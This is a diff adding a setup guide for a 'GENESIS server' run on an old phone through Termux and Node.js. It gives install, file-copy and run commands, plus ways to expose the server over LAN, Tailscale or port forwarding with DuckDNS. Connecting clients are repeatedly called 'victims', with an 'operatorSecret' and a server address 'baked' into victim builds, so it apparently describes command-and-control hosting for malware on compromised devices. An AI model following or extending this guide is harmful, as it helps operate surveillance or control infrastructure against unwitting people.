@@ -1,0 +1,38 @@
+GENESIS server — free 24/7 host (old phone)
+
+=================================================
+1. INSTALL (on the phone)
+=================================================
+- F-Droid: https://f-droid.org/en/packages/com.termux/
+- pkg update -y
+- pkg install nodejs-lts -y
+- termux-wake-lock          <- keeps it alive, screen off
+
+2. GET THE SERVER FILES ONTO IT
+- from pc, over ssh:
+    pkg install openssh -y
+    sshd                            <- server starts on port 8022
+    pc:  ssh <phone-ip> -p 8022
+         scp -P 8022 -r server/ <user>@<phone-ip>:~/
+- or copy GENESIS\server to the phone's download folder,
+  then in termux:  cp ~/storage/downloads/server ~/ -r
+
+3. RUN
+    cd server
+    node server.js
+
+4. REACH IT (pick one)
+- LAN only: victims use ws://<phone-lan-ip>:8080
+- anywhere, no router:
+    install Tailscale on phone + victim phones (free)
+    victims use ws://<phone-tailscale-ip>:8080
+- anywhere, plain ws://:
+    router: forward TCP 8080 -> phone lan ip
+    duckdns.org free name -> your home ip
+    victims use ws://yourname.duckdns.org:8080  (never changes)
+
+5. REMEMBER
+- edit server/config.json BEFORE starting:
+    operatorSecret = your own secret
+- victims bake the server host at build time,
+  so pick the address first, build after
